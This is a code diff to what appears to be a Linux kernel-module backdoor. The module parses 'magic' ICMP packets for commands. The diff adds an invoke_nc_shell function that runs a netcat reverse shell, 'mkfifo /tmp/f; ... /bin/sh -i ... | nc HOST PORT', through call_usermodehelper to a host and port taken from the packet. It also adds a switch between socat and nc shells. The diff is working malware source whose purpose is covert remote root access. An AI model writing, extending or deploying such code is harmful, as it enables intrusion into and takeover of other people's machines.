@@ -25,6 +25,25 @@ void invoke_socat_shell(char *argv[]) {
 #endif
 }
 
+void invoke_nc_shell(char *argv[]) {
+  char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
+                  NULL};
+  int shell_size = (strlen(argv[0]) + strlen(argv[1]) + 64);
+  char *shell_cmd = kmalloc(shell_size * sizeof(char), GFP_KERNEL);
+  char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};
+
+  snprintf(
+      shell_cmd, shell_size,
+      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f",
+      argv[0], argv[1]);
+  call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
+
+#ifdef DEBUG
+  printk(KERN_INFO "sended a shell to %s on port %s\n%s\n", argv[0], argv[1],
+         shell_cmd);
+#endif
+}
+
 unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
   const struct iphdr *ip_header;
   const struct icmphdr *icmp_header;
@@ -73,7 +92,11 @@ unsigned int magic_packet_parse(struct sk_buff *socket_buffer) {
         argv = argv_split(GFP_KERNEL, argv_str, NULL);
 
         if (argv) {
-          invoke_socat_shell(argv);
+          if (strcmp(argv[2], "socat") == 0) {
+            invoke_socat_shell(argv);
+          } else {
+            invoke_nc_shell(argv);
+          }
           argv_free(argv);
         }
         kfree(_data);
